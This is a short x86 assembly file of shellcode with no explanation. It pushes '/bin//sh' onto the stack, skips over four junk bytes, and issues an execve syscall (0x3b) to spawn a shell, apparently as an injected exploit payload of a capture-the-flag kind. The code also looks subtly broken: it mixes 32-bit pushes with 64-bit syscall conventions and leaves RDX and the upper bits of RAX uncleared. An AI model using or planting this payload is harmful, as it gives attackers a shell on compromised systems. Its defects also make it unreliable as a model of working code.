.global _start
_start:
.intel_syntax noprefix

    push 0x68732f2f
    push 0x6e69622f
    xor esi, esi
    jmp label
    .byte 0x41
    .byte 0xd0
    .byte 0xff
    .byte 0xff
label: 
    mov edi, esp
    mov al, 0x3b
    syscall
